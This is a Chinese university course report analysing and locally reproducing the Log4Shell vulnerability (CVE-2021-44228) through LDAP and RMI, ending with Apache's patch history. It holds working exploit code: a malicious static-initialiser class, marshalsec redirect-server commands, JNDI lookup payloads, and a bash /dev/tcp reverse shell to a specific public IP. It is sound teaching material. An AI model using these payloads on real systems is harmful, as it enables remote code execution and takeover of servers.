---
counter: True
comment: True
---

# log4j 漏洞复现

!!! abstract

    这篇是浙江大学 “网络空间安全导论”（大一春夏）的课程报告

    介绍了 log4j 及由其引发的 CVE-2021-44228 漏洞，并从 JNDI、LDAP、RMI、log4j 等方面分析了该漏洞的具体原理，再通过 LDAP、RMI 两种方式本地复现该漏洞，实现远程代码执行和反弹终端，最后介绍该漏洞的修复。

## log4j 漏洞概述
### log4j 简介
log4j 是 Apache 软件基金会的一个开源 Java 日志框架。它提供了丰富可扩展的日志记录与输出功能，可以输出日志到任意位置、更改日志内容样式、指定日志级别并分级别显示、以及利用 ${} 语句输出动态内容等。

随着技术发展，1.x 版本的 log4j 逐渐在结构、性能上被 slf4j、logback 等新兴的日志框架超越，Apache 也因此对 log4j 进行了一次重构升级，发布了优化了结构、性能的 2.x 版本 log4j（又名 log4j2）。log4j2 借鉴了 slf4j 的结构设计，分为了两部分：log4j-api、log4j-core，前者仅提供接口，后者提供实现。包名分别为 org.apache.logging.log4j 和 org.apache.logging.log4j.core。

因为 log4j 的易用性，众多以 Java 作为后端服务语言的网络应用、软件都在使用 log4j 来记录日志。

### CVE-2021-44228
CVE-2021-44228 是阿里云团队在 2021 年 11 月 26 日提交、同年 12 月 9 日公开的关于 log4j 的重大漏洞。它可以实现 RCE（Remote Code Execution，远程代码执行），从而危害使用 log4j 来记录日志的 Java 服务器的安全。CVSS3.0（通用漏洞评分系统）评分 10.0 分、评级 critical。

该漏洞威胁等级高、影响面广泛、利用价值高、利用难度低，受到广泛关注。并且因为 log4j 的广泛应用，包括苹果、谷歌、百度、Steam 等在内的大型互联网企业的产品也都受到该漏洞的影响。

该漏洞由 JNDI 特性引起，其并没有保护通过 LDAP 等查找 JNDI 的方式，造成潜在的 RCE。影响范围从 log4j 版本 2.0-beta9 开始到 2.15.0-rc1，并在 2.15.0-rc2 版本中将这一行为默认关闭，在 2.16.0 版本中完全移除。

## log4j 漏洞原理
### JNDI 简介
JNDI（Java Naming and Directory Interface，Java 命名和目录接口）是用于从 Java 应用中访问名称和目录服务的一组 API，简单来说就是将名称/目录与对象相关联，并提供了通过名称/目录来查找对象的方法。

JNDI 架构分为三层：

- JNDI API：与 Java 应用程序通信，提供编程接口，隔离应用与数据源
- Naming Manager：命名服务管理器
- JNDI SPI：与具体实现方法（服务）相连接

JNDI 支持的服务有很多，比如 RMI、LDAP、DNS 等服务。JNDI 封装了这些服务，使得可以通过类似的代码访问这些服务（调用容器环境的 Context 的 lookup 方法）

### RMI 简介
RMI（Remote Method Invocation，远程方法调用）服务提供了从一个 JVM 中对象调用另一个 JVM 对象方法的方式。也是 RPC（Remote Procedure Calls，远程过程调用）的面向对象等价服务。它需要一个 Server 端提供 RMI 服务和一个 Client 端访问远程提供的 RMI 服务。RMI 服务分为三层：

- 存根与骨架
    - 存根（Stub）：与 Client 端相连，是远程对象的代理
    - 骨架（Skeleton）：与 Server 端相连，代理调用方法
- 远程引用层（Remote Reference Layer）：用来寻找通信对象以及通过 RMI Registry 提供命名服务
- 传输层（Transport Layer）：在 Server 与 Client 端建立 socket 通信

Server 端开启 RMI 服务时先创建远程对象，然后向 registry 注册远程对象，等待调用。Client 端进行 RMI 时访问 registry 得到远程对象的存根，再通过存根远程调用方法，存根序列化调用后与骨架通信使骨架代理调用方法并将结果返回给存根再反序列化交给客户端。

### LDAP 简介
LDAP（Lightweight Directory Access Protocol，轻型目录访问协议）是一个开放的、中立的、工业标准的应用协议，通过 TCP/IP 协议提供访问控制和维护分布式信息的目录服务，可以通过 LDAP 协议来访问网络资源，可以看成一个树形的数据库。

### JNDI 注入原理
如前面所说，JNDI 封装了一些服务，并且通过 lookup 来访问服务，例如通过 lookup("rmi://ip:port/...") 的形式访问 ip:port 提供的 RMI 服务，通过 lookup("ldap://ip:port/...") 的形式访问 LDAP 服务。

JNDI 的目的是通过名称/目录获取对象，而远程读取的一般是编译后的 .class 文件所以在 lookup 时会进行类加载，JVM 将其加载为 Java 类。而当 ClassLoader 加载 .class 文件的时候会调用类的 clinit 方法，执行类的静态代码。因此如果可以控制 JNDI lookup 的 URL，便可以任意加载远程类，执行恶意代码，这也就是 JNDI 注入原理。

但是 JNDI 注入受到 JDK 配置限制，如果 com.sun.jndi.xxx.object.trustURLCodebase 这一配置是 false 时则不会信任 URL 从而无法进行 JNDI 注入。在 JDK 11.0.1、8u191、7u201、6u211 等版本中这一配置默认是 true，而从 6u132、7u122、8u113 开始，这一配置默认为 false（因此后面使用高版本 JDK 复现时要手动开启这一配置）

### CVE-2021-44228 漏洞原理
CVE-2021-44228 即是通过 log4j 来实现了 JNDI 注入。log4j 可以通过 \${} 语法来获取动态内容并输出到日志中，其中对于每个 \${} 部分使用 lookup 方法来解决变量，其中也提供了 JndiLookup，也就是说可以使用 JNDI 来读取内容，形如 \${jndi:...}。这时就存在 JNDI 注入。

而大部分使用 log4j 来记录日志的网络应用都会记录用户的输入，比如搜索网站会记录用户搜索的内容，这时如果用户输入的是 \${jndi:...}（比如 ${jndi:ldap://ip:port/...}） 就会进行 JndiLookup，实现 JNDI 注入，这也就是 CVE-2021-44228 这个漏洞的原理。

## log4j 漏洞复现
下面分别通过调用 LDAP 和 RMI 服务的方式来复现这一 JNDI 注入漏洞。
### LDAP 实现
进行这一漏洞的复现需要以下两个部分：

- 一个 LDAP 服务，用来重定向提供攻击类
    - 需要一个网络服务来为其提供攻击类
- 一个包含存在漏洞的 log4j 组件的 Java 应用

#### 攻击类
首先是用于发起攻击的 Exploit 类，代码如下：
```Java
public class Exploit {
    static {
        try {
            String[] cmds = {"open", "/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
使用 javac Exploit.java 将这个类编译为 .class 类文件，然后使用 python -m http.server 8888 为当前目录在 8888 端口开启一个 HTTP 服务。可以通过 curl -I 127.0.0.1:8888/Exploit.class 来检查是否正常部署，能否获取到当前 Exploit 类文件。

#### LDAP 服务
使用 marshalsec 提供的工具来直接搭建 LDAP 服务
```shell
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests # 通过 maven 构建

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```
这个 LDAP 服务直接提供了对 8888 端口中的 Exploit 类文件的重定向访问，端口在默认的 1389。

#### log4j 漏洞应用
编写一个只调用了 log4j 记录 ${jndi:ldap://127.0.0.1:1389/Exploit} 的类（这个 payload 一般是由用户输入获取的，但这里方便复现直接硬编码到漏洞应用中了，二者本质是一样的），代码如下：
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
```
注意因为是高版本 JDK，所以需要手动开启 com.sun.jndi.ldap.object.trustURLCodebase 选项。

#### 复现攻击
前面已经正常开启了 LDAP 服务，所以漏洞应用运行时可以直接加载到 Exploit 类，执行其中静态代码。因为其中通过 exec 执行了 open /System/Applications/Calculator.app 命令，所以会弹出计算器应用。
![](/assets/images/cs/web/log4j_vuln/ldap_calc.png)

可以看到 LDAP 服务端输出了一条发送 LDAP 引用的语句，说明 log4j 应用确实连接了 LDAP 服务端并获取了 Exploit.class 类文件。而且因为其中的静态代码通过 exec 执行了 open /System/Applications/Calculator.app 命令，所以看到弹出了计算器，说明了这个静态代码确实被执行了。这也就复现了这个漏洞。

接下来更换一下 exec 执行的命令，来实现反弹终端。

首先在远程公网服务器（ip 是 47.103.43.32）通过 nc -lnvvp 7777 在 7777 端口监听，用来捕获反弹的终端。然后更改攻击类代码：
```java
String[] cmds = {"/bin/bash", "-c", "bash -i >& /dev/tcp/47.103.43.32/7777 0>&1"};
java.lang.Runtime.getRuntime().exec(cmds).waitFor();
```
即通过 /dev/tcp 设备将 bash 的输入输出流重定向到公网服务器上，实现 get shell。运行 log4j 漏洞应用：
![](/assets/images/cs/web/log4j_vuln/ldap_getshell.png)

由图可以看出，远程服务器已经连接上了当前运行 log4j 漏洞应用的 macOS 主机。

#### 调用栈分析
通过调试运行 log4j 漏洞应用可以获取到整个程序的调用栈：
```java
<clinit>:11, Exploit
forName0:-1, Class (java.lang)
forName:348, Class (java.lang)
loadClass:91, VersionHelper12 (com.sun.naming.internal)
loadClass:101, VersionHelper12 (com.sun.naming.internal)
loadClass:115, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1114, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:11, log4j
```
可以较清晰地分析出来程序进入执行 logger.error，然后在 log 中逐层调用最终调用到 resolveVariable 即处理 ${} 变量，然后调用到了 Interpolator 的 lookup 方法，其中寻找到了 JndiLookup 类，调用其 lookup 方法，从 LDAP 服务获取类，然后从中 getObjectInstance，这里会进行 loadClass 操作，而其中调用了 Exploit 类隐藏的 clinit 方法也就是静态代码，造成 RCE。

### RMI 实现

RMI 的实现类似 LDAP，Exploit 类同样使用调用计算器的代码，通过 python 开启 HTTP 服务提供给 RMI。然后同样通过 marshalsec 来搭建 RMI 服务（默认端口在 1099）：
```shell
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.RMIRefServer "http://127.0.0.1:8888/#Exploit"
```
略修改一下 log4j 漏洞应用，使之记录 ${jndi:rmi://127.0.0.1:1099/Exploit}：
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:rmi://127.0.0.1:1099/Exploit}");
    }
}
```
运行发现计算器已被调出：
![](/assets/images/cs/web/log4j_vuln/rmi_calc.jpg)

## log4j 漏洞修复

高版本的 JDK 中设置了 com.sun.jndi.xxx.object.trustURLCodebase 默认为 false，这可以防止一部分 JNDI 注入的发生。

在 CVE-2021-42288 发布后，Apache 通过 #608 这个 pull request 来对 LDAP 进行了限制，并发布了 2.15.0-rc1 版本。但这个版本仍存在绕过方式，即通过构造出会抛出异常的 payload 就可以绕过检验。

随后 Apache 又进行了对于异常 URI 的处理，发布了 2.15.0-rc2 版本，但这个版本仍会通过较复杂的绕过实现 RCE。因此在 2.16.0-rc1 版本中，Message Lookups 被彻底删除，这个漏洞被触发的情况就更少了，但如果开发者手动开启 JNDI 功能，则仍有可能通过一系列绕过实现注入。

但是在 2.16.0 版本中如果没有开启 JNDI 功能，则双层嵌套的 \${\${...}} 会导致无限递归，从而造成 DoS 攻击，这也就是后续的 CVE-2021-45046 这个漏洞。随后在 2.17.0 版本中 Apache 修复了这个问题，并且限制即使开启了 JNDI 功能，其仅支持 java 协议而不支持 ldap，2.15.0-rc2 和 2.16.0 中的绕过也无效了。因此 2.17.0 也就成为了可以完全防止这一漏洞的 log4j 版本了。

## Reference

<div class="reference" markdown="1">

1. CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228
1. NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
1. Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html
1. 【漏洞通告】Apache Log4j2 远程代码执行漏洞（CVE-2021-44228/CVE-2021-45046）. https://help.aliyun.com/noticelist/articleid/1060971232.html
1. Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/
1. tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
1. mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec
1. log4j 远程命令执行漏洞原理及修复方案. https://zhuanlan.zhihu.com/p/444140910
1. JNDI 远程命令执行漏洞原理分析及解决方案. https://zhuanlan.zhihu.com/p/447220806
1. Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
1. Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html
1. TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm
1. Java 中 RMI 的使用. https://cloud.tencent.com/developer/article/1824106
1. Pickle, 远程方法调用（RMI）原理与示例. https://www.cnblogs.com/wxisme/p/5296441.html
1. Authing 身份云, LDAP 协议入门（轻量目录访问协议）. https://zhuanlan.zhihu.com/p/147768058
1. JNDI 注入原理及利用. https://xz.aliyun.com/t/6633#toc-7
1. hldfight, log4j 官方漏洞修复史. https://blog.csdn.net/qsort_/article/details/122101423
1. rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608
1. LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623
1. 从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞 - 2.15.0 rc1绕过详解. https://paper.seebug.org/1789/#0x06-2150-rc1
1. 4ra1n, 浅谈 Log4j2 之 2.15.0 版本 RCE. https://xz.aliyun.com/t/10689

</div>